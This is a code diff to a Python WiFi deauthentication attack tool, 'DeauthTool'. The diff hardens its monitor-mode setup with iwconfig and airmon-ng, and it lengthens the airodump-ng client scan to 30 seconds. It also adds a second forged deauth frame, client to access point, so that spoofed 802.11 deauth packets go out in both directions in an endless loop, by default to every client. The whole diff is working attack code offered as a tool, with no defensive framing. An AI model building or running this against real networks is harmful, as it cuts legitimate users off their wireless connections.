@@ -237,11 +237,41 @@ class DeauthTool:
         ) as progress:
             task = progress.add_task("[cyan]Enabling monitor mode...", total=None)
             try:
-                os.system(f'airmon-ng check kill')
-                os.system(f'airmon-ng start {self.interface}')
-                self.monitor_mode = True
-                progress.update(task, completed=100)
-                self.console.print(f"[bold green]✓ Monitor mode enabled on {self.interface}[/bold green]")
+                # Kill interfering processes
+                os.system('airmon-ng check kill')
+                time.sleep(1)
+                
+                # Stop the interface
+                os.system(f'ip link set {self.interface} down')
+                time.sleep(1)
+                
+                # Set monitor mode
+                os.system(f'iwconfig {self.interface} mode monitor')
+                time.sleep(1)
+                
+                # Bring interface back up
+                os.system(f'ip link set {self.interface} up')
+                time.sleep(1)
+                
+                # Verify monitor mode
+                output = subprocess.check_output(['iwconfig', self.interface]).decode()
+                if 'Mode:Monitor' in output:
+                    self.monitor_mode = True
+                    progress.update(task, completed=100)
+                    self.console.print(f"[bold green]✓ Monitor mode enabled on {self.interface}[/bold green]")
+                else:
+                    # Fallback to airmon-ng if iwconfig method failed
+                    os.system(f'airmon-ng start {self.interface}')
+                    time.sleep(1)
+                    # Check again
+                    output = subprocess.check_output(['iwconfig', self.interface]).decode()
+                    if 'Mode:Monitor' in output:
+                        self.monitor_mode = True
+                        progress.update(task, completed=100)
+                        self.console.print(f"[bold green]✓ Monitor mode enabled on {self.interface}[/bold green]")
+                    else:
+                        raise Exception("Failed to enable monitor mode")
+                        
             except Exception as e:
                 self.console.print(f"[bold red]❌ Failed to enable monitor mode: {e}[/bold red]")
                 sys.exit(1)
@@ -429,12 +459,12 @@ class DeauthTool:
                 os.makedirs(scan_dir, exist_ok=True)
                 output_file = os.path.join(scan_dir, "scan")
 
-                # Start airodump-ng focused on target network
-                cmd = f"airodump-ng -w {output_file} --output-format csv --bssid {self.bssid} --channel {self.network_info['channel']} {self.interface}"
+                # Start airodump-ng focused on target network with channel hopping
+                cmd = f"airodump-ng -w {output_file} --output-format csv --bssid {self.bssid} {self.interface}"
                 process = subprocess.Popen(cmd.split(), stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                 
-                # Let it run for 15 seconds
-                time.sleep(15)
+                # Let it run for 30 seconds to catch more clients
+                time.sleep(30)
                 process.terminate()
                 
                 # Read the CSV file
@@ -571,12 +601,22 @@ class DeauthTool:
         """Perform deauthentication attack"""
         target = self.client if self.client else "ff:ff:ff:ff:ff:ff"
         
-        packet = RadioTap() / Dot11(
+        # Create deauth packet from AP to client
+        deauth_ap_to_client = RadioTap() / Dot11(
             type=0,
             subtype=12,
-            addr1=target,
-            addr2=self.bssid,
-            addr3=self.bssid
+            addr1=target,  # Destination address (client)
+            addr2=self.bssid,  # Source address (AP)
+            addr3=self.bssid  # BSSID
+        ) / Dot11Deauth(reason=7)
+        
+        # Create deauth packet from client to AP
+        deauth_client_to_ap = RadioTap() / Dot11(
+            type=0,
+            subtype=12,
+            addr1=self.bssid,  # Destination address (AP)
+            addr2=target,  # Source address (client)
+            addr3=self.bssid  # BSSID
         ) / Dot11Deauth(reason=7)
         
         attack_info = Table(title="Attack Information", show_header=False, title_style="bold red")
@@ -585,6 +625,7 @@ class DeauthTool:
         
         attack_info.add_row("Target Network", self.network_info['ssid'])
         attack_info.add_row("BSSID", self.bssid)
+        attack_info.add_row("Channel", str(self.network_info['channel']))
         if self.client:
             client_info = next((client for client in self.clients if client['mac'] == self.client), None)
             if client_info:
@@ -595,6 +636,10 @@ class DeauthTool:
             attack_info.add_row("Target", "All Clients")
             
         self.console.print(Panel(attack_info, title="[bold red]⚡ Starting Deauthentication Attack[/bold red]"))
+        
+        # Set interface to the correct channel
+        os.system(f"iwconfig {self.interface} channel {self.network_info['channel']}")
+        time.sleep(1)
             
         try:
             with Live(auto_refresh=False) as live:
@@ -602,8 +647,10 @@ class DeauthTool:
                 start_time = time.time()
                 
                 while True:
-                    sendp(packet, iface=self.interface, verbose=False)
-                    packets_sent += 1
+                    # Send deauth in both directions
+                    sendp(deauth_ap_to_client, iface=self.interface, verbose=False)
+                    sendp(deauth_client_to_ap, iface=self.interface, verbose=False)
+                    packets_sent += 2
                     elapsed = time.time() - start_time
                     
                     status = Table.grid()
